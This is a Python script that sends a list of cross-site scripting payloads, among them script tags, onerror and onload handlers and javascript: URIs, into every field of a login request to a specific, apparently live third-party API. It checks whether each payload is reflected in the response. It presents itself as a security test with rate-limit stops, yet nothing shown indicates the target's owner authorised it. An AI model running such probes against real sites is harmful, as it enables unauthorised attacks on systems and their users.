import requests
import time
import json

URL = "https://dsapi.thelocal.co.in/dc/api/v1/auth/login"

headers = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

base_payload = {
    "email": "securitytest@example.com",
    "password": "InvalidPassword123!",
    "platform": "android",
    "deviceId": "security-test-device"
}

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<h1>XSS_TEST</h1>",
    "'><img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>"
]

fields = ["email", "password", "platform", "deviceId"]

for field in fields:

    print("\n" + "=" * 60)
    print("TESTING FIELD:", field)
    print("=" * 60)

    for index, payload_value in enumerate(xss_payloads, 1):

        test_data = base_payload.copy()
        test_data[field] = payload_value

        try:
            start = time.time()

            response = requests.post(
                URL,
                json=test_data,
                headers=headers,
                timeout=15
            )

            elapsed = round(time.time() - start, 3)

            print(f"\nTest {index}: {payload_value}")
            print("HTTP Status:", response.status_code)
            print("Response Time:", elapsed)

            body = response.text

            if payload_value in body:
                print("WARNING: Payload reflected in response")
            else:
                print("Payload not directly reflected")

            print("Response:", body[:250])

            if response.status_code == 429:
                print("\nRATE LIMIT DETECTED. STOPPING TEST.")
                raise SystemExit

            if response.status_code >= 500:
                print("WARNING: Server-side error. Investigate.")

            time.sleep(3)

        except requests.exceptions.RequestException as error:
            print("Request failed:", error)
            raise SystemExit